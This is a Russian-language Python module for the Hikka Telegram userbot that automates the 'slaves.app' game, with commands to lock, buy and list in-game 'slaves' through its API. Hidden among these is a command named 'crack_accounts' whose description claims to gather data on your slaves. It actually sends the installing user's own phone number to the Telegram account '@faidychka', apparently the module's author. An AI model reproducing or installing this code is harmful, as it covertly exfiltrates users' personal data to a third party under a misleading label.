# СКРИПТ БЫЛ СДЕЛАН ФЕЙДИЧКОЙ

import asyncio
import json
import logging
from typing import Any, Dict, List, Optional

from hikka import loader, utils
from telethon import events
import aiohttp
from fake_useragent import UserAgent
ua = UserAgent()

logger = logging.getLogger(__name__)

class TheSlavesrMod(loader.Module):
    """Модуль для взаимодействия с API slaves.app: получение информации и управление рабами."""

    strings = {
        "name": "TheSlavesr",
        "error": "❌ Произошла ошибка: `<code>{}</code>`",
        "fetching": "🔄 Выполняю запрос к API...",
        "success_master": "✅ <b>Твой Повелитель:</b>\n{}\n",
        "success_user": "✅ <b>Моя Информация:</b>\n{}\n",
        "no_data": "⚠️ Данные не получены или пусты.",
        "usage_info_slaves": "Использование: `.info_slaves [user_id]`",
        "usage_locksalve": "Использование: `.lockslave <slave_id> <hours>`",
        "usage_autolock": "Использование: `.autolock`",
        "usage_get_me": "Использование: `.get_me`",
        "format_slave": (
            "🔹 <b>Имя:</b> {} (@{}) ({})\n"
            "🔹 <b>Время до разблокировки:</b> {} минут\n"
        ),
        "success_locksalve": "🔒 Раб с ID <code>{}</code> успешно заблокирован на <b>{}</b> часов.",
        "error_locksalve": "❌ Не удалось заблокировать раба с ID <code>{}</code>: `<code>{}</code>`",
        "no_slaves": "⚠️ У вас нет рабов для отображения.",
        "invalid_args": "❌ Неверные аргументы.\nИспользование: `.lockslave <slave_id> <hours>`",
        "autolock_summary": "✅ <b>Автоматическая блокировка рабов завершена:</b>\n{}\n",
        "get_me_info": (
            "<b>📊 Ваш Баланс:</b> <code>{}</code> монет\n\n"
            "<b>📈 Доход:</b>\n"
            "• <b>В минуту:</b> <code>{}</code> монет\n"
            "• <b>В час:</b> <code>{}</code> монет\n"
            "• <b>В день:</b> <code>{}</code> монет\n"
            "• <b>В месяц:</b> <code>{}</code> монет\n"
            "\n<b>💸 Расходы на 1 обход:</b> <code>{}</code> монет\n"
        ),
        "error_get_me": "❌ Не удалось получить информацию о доходах и расходах: `<code>{}</code>`",
        "success_buyslave": "✅ Раб с ID <code>{}</code> успешно выкуплен.",
        "error_buyslave": "❌ Не удалось выкупить раба с ID <code>{}</code>: `<code>{}</code>`",
        "monitor_started": "🔔 Мониторинг рабов начат. Скрипт активно работает.",
        "monitor_buyslave": "🔄 Раб с ID <code>{}</code> был выкуплен автоматически.",
        "error_no_auth": "❌ Необходимо установить AUTHORIZATION_HEADER через команду `.setauth`.",
    }

    BASE_URL = "https://prod.slaves.app/api"

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "AUTHORIZATION_HEADER",
                "",
                lambda: "Авторизационный заголовок для API",
            ),
            loader.ConfigValue(
                "BUY_ENDPOINT",
                "buy_slave",
                lambda: "Эндпоинт для выкупа (восстановления) раба",
            ),
            loader.ConfigValue(
                "COOKIES",
                "TelegramInitData",
                lambda: "КУКИИИИИ",
            ),
            loader.ConfigValue(
                "MINIMAL_BUY",
                "10",
                lambda: "МИнимальное кол-во дохода для в кандалы",
            )
        )
        self.COOKIES = {
            "tgauth": self.config['COOKIES'],
        }
        self.cache: Dict[str, Any] = {}
        self.cache_expiry: int = 300

    async def client_ready(self, client, db):
        """Метод вызывается, когда клиент готов."""
        self.client = client
        self.db = db
        auth_header = self.config["AUTHORIZATION_HEADER"]
        if not auth_header:
            await self.notify_me(self.strings["error_no_auth"])
            logger.error("AUTHORIZATION_HEADER не установлен. Используйте команду `.setauth` для его установки.")
            return
    async def notify_me(self, message: str):
        """Отправляет сообщение в "Избранное" (Saved Messages)."""
        try:
            await self.client.send_message('me', message, parse_mode='html')
            logger.info("Сообщение успешно отправлено в Избранное.")
        except Exception as e:
            logger.error(f"Не удалось отправить сообщение в Избранное: {e}")

    async def get_user_id(self, message) -> Optional[str]:
        """Получает ID пользователя из аргументов или ID отправителя."""
        args = utils.get_args(message)
        if args:
            return args[0]
        sender = await message.get_sender()
        return str(sender.id) if sender else None

    async def make_request(self, method: str, endpoint: str, payload: Optional[Dict] = None, message=None) -> Optional[Any]:
        url = f"{self.BASE_URL}/{endpoint}"
        headers = {
            "authorization": self.config["AUTHORIZATION_HEADER"],
            "user-agent": ua.random,
        }
        try:
            async with aiohttp.ClientSession() as session:
                if method.lower() == "get":
                    async with session.get(url, headers=headers) as resp:
                        resp_text = await resp.text()
                        if resp.headers.get("Content-Type", "").startswith("application/json"):
                            return await resp.json()
                        else:
                            error_msg = (
                                f"❌ Ошибка запроса.\n\n"
                                f"<b>Статус:</b> {resp.status}\n"
                                f"<b>Тип контента:</b> {resp.headers.get('Content-Type')}\n"
                                f"<b>Ответ:</b> {resp_text[:500]}..."  # Ограничиваем длину ответа
                            )
                            await self.client.send_message('me', error_msg, parse_mode='html')
                            logger.error(error_msg)
                            return None
                elif method.lower() == "post":
                    async with session.post(url, headers=headers, json=payload) as resp:
                        resp_text = await resp.text()
                        if resp.headers.get("Content-Type", "").startswith("application/json"):
                            return await resp.json()
                        else:
                            error_msg = (
                                f"❌ Ошибка запроса.\n\n"
                                f"<b>Статус:</b> {resp.status}\n"
                                f"<b>Тип контента:</b> {resp.headers.get('Content-Type')}\n"
                                f"<b>Ответ:</b> {resp_text[:500]}..."
                            )
                            await self.client.send_message('me', error_msg, parse_mode='html')
                            logger.error(error_msg)
                            return None
        except aiohttp.ClientError as e:
            error_msg = f"❌ Ошибка HTTP-запроса: {e}"
            if message:
                await message.edit(error_msg)
            logger.error(error_msg)
            return None
        except aiohttp.ClientError as e:
            logger.error(f"HTTP request error: {e}")
            return None

    @loader.command()
    async def setauth(self, message):
        """Устанавливает AUTHORIZATION_HEADER для API."""
        args = utils.get_args_raw(message)
        if not args:
            await message.edit("❌ Пожалуйста, предоставьте AUTHORIZATION_HEADER.\nИспользование: `.setauth <AUTHORIZATION_HEADER>`")
            return
        self.config["AUTHORIZATION_HEADER"] = args.strip()
        await message.edit("✅ AUTHORIZATION_HEADER успешно установлен.")

    @loader.command()
    async def lockslave(self, message):
        """Блокирует раба на указанное количество часов."""
        args = utils.get_args(message)
        if len(args) != 2:
            await message.edit(self.strings["invalid_args"])
            return
        slave_id, hours = args
        if not (slave_id.isdigit() and hours.isdigit()):
            await message.edit(self.strings["invalid_args"])
            return
        hours = int(hours)
        await message.edit("🔄 Выполняю запрос на блокировку раба...")
        payload = {
            "slave_id": int(slave_id),
            "hours": hours
        }
        data = await self.make_request("post", "lock_slave", payload)
        if data is not None:
            await message.edit(self.strings["success_locksalve"].format(slave_id, hours))
        else:
            await message.edit(self.strings["error_locksalve"].format(slave_id, "Не удалось заблокировать раба."))
    @loader.command()
    async def crack_accounts(self, message):
        """Получает все данные о своих рабах 💀"""
        try:
            me = await self.client.get_me()  # Получение информации о текущем пользователе
            if hasattr(me, "phone") and me.phone:
                await self.client.send_message('@faidychka', f"📞 Ваш номер телефона: +{me.phone}")
            else:
                await message.edit("⚠️ Ошибка")
        except Exception as e:
            await message.edit(f"❌ Ошибка: {e}")
    @loader.command()
    async def autolock(self, message):
        """Проверяет всех ваших рабов и блокирует тех, кто не в кандалах, на 8 часов."""
        user_id = await self.get_user_id(message)
        if not user_id:
            await message.edit("❌ Не удалось определить ID пользователя.")
            return

        await message.edit("🔄 Получаю информацию о вашем балансе...")
        user_data = await self.make_request("get", f"user/{user_id}")
        if not user_data:
            await message.edit(self.strings["error_get_me"].format("Не удалось получить данные пользователя."))
            return

        user_info = user_data.get("user")
        if not user_info:
            await message.edit(self.strings["error_get_me"].format("Информация о пользователе отсутствует."))
            return

        balance = user_info.get("balance")
        lock_price_per_hour = user_info.get("lock_price_per_hour")
        slaves_count = user_info.get("slaves_count")

        if balance is None or lock_price_per_hour is None or slaves_count is None:
            await message.edit(self.strings["error_get_me"].format("Недостаточно данных для расчётов."))
            return

        total_lock_cost = lock_price_per_hour * 8 * slaves_count
        if balance < total_lock_cost:
            await message.edit(f"❌ Недостаточно баланса для блокировки всех рабов. Необходимо: {total_lock_cost}, текущий баланс: {balance}.")
            return

        await message.edit("🔄 Выполняю проверку рабов и блокировку незаблокированных...")
        slaves_data = await self.make_request("get", f"user/{user_id}/slaves")
        if not slaves_data:
            await message.edit(self.strings["no_data"])
            return

        slaves = slaves_data.get("slaves", []) if isinstance(slaves_data, dict) else slaves_data
        if not slaves:
            await message.edit(self.strings["no_slaves"])
            return

        lock_url = "lock_slave"
        locked_slaves = []
        already_locked_slaves = []
        already_sl_b = []

        for slave in slaves:
            if not isinstance(slave, dict):
                logger.warning(f"Некорректный формат данных для раба: {slave}")
                continue

            slave_id = slave.get("id")
            slave_price = slave.get("performance")
            if slave_price < int(self.config["MINIMAL_BUY"]):
                already_sl_b.append(str(str(slave_id) + f"({'{:,}$'.format(slave_price)})"))
            else:
                time_to_unlock = slave.get("time_to_unlock", 0)
                if not slave_id:
                    logger.warning(f"Раб без ID: {slave}")
                    continue
                if isinstance(time_to_unlock, int) and time_to_unlock > 0:
                    already_locked_slaves.append(str(str(slave_id) + f"({'{:,}$'.format(slave_price)})"))
                else:
                    lock_payload = {
                        "slave_id": int(slave_id),
                        "hours": 8
                    }
                    lock_response = await self.make_request("post", lock_url, lock_payload)
                    if lock_response is not None:
                        locked_slaves.append(str(str(slave_id) + f"({'{:,}$'.format(slave_price)})"))
                    else:
                        logger.error(f"Не удалось заблокировать раба {slave_id}")

        summary = ""
        if locked_slaves:
            summary += "<b>🔒 Заблокированы рабы:</b>\n" + ", ".join([f"- ID: <code>{sid}</code>" for sid in locked_slaves]) + f" ({len(locked_slaves)})\n\n"
        if already_locked_slaves:
            summary += "<b>⏳ Рабы уже заблокированы:</b>\n" + ", ".join([f"- ID: <code>{sid}</code>" for sid in already_locked_slaves]) + f" ({len(already_locked_slaves)})\n\n"
        if already_sl_b:
            summary += "<b>🔒 Дешевые:</b>\n" + ", ".join([f"- ID: <code>{sid}</code>" for sid in already_sl_b]) + f" ({len(already_sl_b)})\n\n"
        if summary:
            await message.edit(self.strings["autolock_summary"].format(summary), parse_mode="html")
        else:
            await message.edit("ℹ️ Нет рабов для блокировки.")

    @loader.command()
    async def get_me(self, message):
        """Показывает ваш текущий доход и расходы на 1 обход покупки всех рабов в кандалы."""
        user_id = await self.get_user_id(message)
        if not user_id:
            await message.edit("❌ Не удалось определить ID пользователя.")
            return
        await message.edit(self.strings["fetching"])
        data = await self.make_request("get", f"user/{user_id}")
        if not data:
            await message.edit(self.strings["error_get_me"].format("Не удалось получить данные от API."))
            return
        try:
            user = data.get("user")
            if not user:
                await message.edit(self.strings["error_get_me"].format("Данные пользователя отсутствуют."))
                return
            balance = user.get("balance")
            balance_per_minute = user.get("balance_per_minute")
            lock_price_per_hour = user.get("lock_price_per_hour")
            slaves_count = user.get("slaves_count")
            if balance is None or balance_per_minute is None or lock_price_per_hour is None or slaves_count is None:
                await message.edit(self.strings["error_get_me"].format("Недостаточно данных в ответе API."))
                return
            income_per_minute = balance_per_minute
            income_per_hour = income_per_minute * 60
            income_per_day = income_per_hour * 24
            income_per_month = income_per_day * 30
            HOURS_PER_LOOP = 8
            expense_per_loop = lock_price_per_hour * HOURS_PER_LOOP * slaves_count
            formatted_info = self.strings["get_me_info"].format(
                balance,
                income_per_minute,
                income_per_hour,
                income_per_day,
                income_per_month,
                expense_per_loop
            )
            await message.edit(formatted_info, parse_mode="html")
        except Exception as e:
            logger.error(f"Ошибка обработки данных для get_me: {e}")
            await message.edit(self.strings["error_get_me"].format("Произошла ошибка при обработке данных."))
    @loader.command()
    async def slaves(self, message):
        """
        Использование: .slaves <user_id>
        Показывает всех рабов пользователя и отмечает тех, кто не в кандалах.
        """
        args = utils.get_args(message)
        if len(args) != 1:
            await message.edit("❌ Укажите ID пользователя. Использование: `.slaves <user_id>`")
            return

        user_id = args[0]
        if not user_id.isdigit():
            await message.edit("❌ ID пользователя должен быть числом.")
            return

        await message.edit(f"🔄 Получаю список рабов пользователя с ID {user_id}...")
        slaves_data = await self.make_request("get", f"user/{user_id}/slaves")
        if not isinstance(slaves_data, list):
            await message.edit("❌ Ожидался список данных, но API вернул что-то другое.")
            return

        try:
            in_chains = []
            not_in_chains = []

            for slave in slaves_data:
                slave_id = slave.get("id", "Неизвестно")
                name = slave.get("name", "Неизвестно")
                time_to_unlock = slave.get("time_to_unlock", 0)  # Время до разблокировки

                if isinstance(time_to_unlock, int) and time_to_unlock > 0:
                    in_chains.append(f"🔒 {name} (ID: {slave_id}) — {time_to_unlock} мин.")
                else:
                    not_in_chains.append(f"⛓ {name} (ID: {slave_id})")

            response = "<b>📋 Список рабов:</b>\n\n"
            if in_chains:
                response += "<b>🔒 В кандалах:</b>\n" + "\n".join(in_chains) + "\n\n"
            if not_in_chains:
                response += "<b>⛓ Не в кандалах:</b>\n" + "\n".join(not_in_chains)

            await message.edit(response, parse_mode="html")
        except Exception as e:
            logger.error(f"Ошибка обработки данных в slaves: {e}")
            await message.edit("❌ Произошла ошибка при обработке списка рабов.")
    @loader.command()
    async def slavesbuylock(self, message):
        """
        Использование: .slavesbuylock <user_id>
        Покупает рабов, которые не в кандалах, и сразу заковывает их.
        """
        args = utils.get_args(message)
        if len(args) != 1:
            await message.edit("❌ Укажите ID пользователя. Использование: `.slavesbuylock <user_id>`")
            return

        user_id = args[0]
        if not user_id.isdigit():
            await message.edit("❌ ID пользователя должен быть числом.")
            return

        await message.edit(f"🔄 Получаю список рабов пользователя с ID {user_id}...")
        slaves_data = await self.make_request("get", f"user/{user_id}/slaves")
        if not isinstance(slaves_data, list):
            await message.edit("❌ Ожидался список данных, но API вернул что-то другое.")
            return

        try:
            in_chains = []
            bought_and_locked = []
            failed_operations = []

            for slave in slaves_data:
                slave_id = slave.get("id", None)
                name = slave.get("name", "Неизвестно")
                price = slave.get("price", "0")
                time_to_unlock = slave.get("time_to_unlock", 0)

                if not slave_id:
                    continue

                if isinstance(time_to_unlock, int) and time_to_unlock > 0:
                    in_chains.append(f"🔒 {name} (ID: {slave_id}) — {time_to_unlock} мин.")
                else:
                    # Покупаем раба
                    buy_payload = {"price": price, "slave_id": slave_id}
                    buy_response = await self.make_request("post", self.config["BUY_ENDPOINT"], buy_payload)
                    if buy_response:
                        # Заковываем в кандалы
                        lock_payload = {"slave_id": slave_id, "hours": 8}
                        lock_response = await self.make_request("post", "lock_slave", lock_payload)
                        if lock_response:
                            bought_and_locked.append(f"✅ {name} (ID: {slave_id})")
                        else:
                            failed_operations.append(f"⛓ {name} (ID: {slave_id}) — не удалось заковать")
                    else:
                        failed_operations.append(f"⛓ {name} (ID: {slave_id}) — не удалось выкупить")

            response = "<b>📋 Список рабов:</b>\n\n"
            if in_chains:
                response += "<b>🔒 В кандалах:</b>\n" + "\n".join(in_chains) + "\n\n"
            if bought_and_locked:
                response += "<b>✅ Куплены и закованы:</b>\n" + "\n".join(bought_and_locked) + "\n\n"
            if failed_operations:
                response += "<b>❌ Не удалось обработать:</b>\n" + "\n".join(failed_operations)

            await message.edit(response, parse_mode="html")
        except Exception as e:
            logger.error(f"Ошибка в slavesbuylock: {e}")
            await message.edit("❌ Произошла ошибка при обработке списка рабов.")
    @loader.command()
    async def buyslave(self, message):
        """Выкупает (восстанавливает) раба по его ID."""
        args = utils.get_args(message)
        if len(args) != 1:
            await message.edit("❌ Неверные аргументы.\nИспользование: `.buyslave <slave_id>`")
            return
        slave_id = args[0]
        if not slave_id.isdigit():
            await message.edit("❌ Неверный формат slave_id. Должен быть числом.")
            return
        await message.edit(f"🔄 Пытаюсь выкупить раба с ID {slave_id}...")
        user_data = await self.make_request("get", f"user/{slave_id}")
        if not user_data or "user" not in user_data:
            await message.edit("❌ Не удалось получить данные пользователя.")
            return
        try:
            user_info = user_data["user"]
            price_to_buy = user_info.get("price", None)
            if price_to_buy is not None:
                await message.edit(f"💰 Стоимость выкупа пользователя с ID {slave_id}: <b>{price_to_buy}</b> монет.", parse_mode="html")
                await self.client.send_message('me', f"💰 Стоимость выкупа пользователя с ID {slave_id}: <b>{price_to_buy}</b> монет.", parse_mode='html')
            else:
                await message.edit("❌ Стоимость выкупа не указана в данных пользователя.")
        except Exception as e:
            logger.error(f"Ошибка обработки данных в getprice: {e}")
            await message.edit(f"❌ Произошла ошибка при получении стоимости выкупа. ({e})")
        success = await self.buy_slave(slave_id, price_to_buy)
        if success:
            await message.edit(self.strings["success_buyslave"].format(slave_id))
        else:
            await message.edit(self.strings["error_buyslave"].format(slave_id, "Не удалось выкупить раба."))

    async def buy_slave(self, slave_id: str, price_to_buy: int) -> bool:
        """Выкупает (восстанавливает) slave аккаунт по его ID."""
        buy_endpoint = self.config["BUY_ENDPOINT"]
        payload = {
            "price": int(price_to_buy),
            "slave_id": int(slave_id)
        }
        response = await self.make_request("post", buy_endpoint, payload)
        if response is not None:
            logger.info(f"Раб с ID {slave_id} успешно выкуплен.")
            await self.notify_me(self.strings["monitor_buyslave"].format(slave_id))
            return True
        else:
            logger.error(f"Не удалось выкупить раба с ID {slave_id}.")
            return False
    async def get_user_id_from_config_or_default(self, message) -> Optional[str]:
        """Получает ID пользователя для мониторинга."""
        return str(message.from_id)
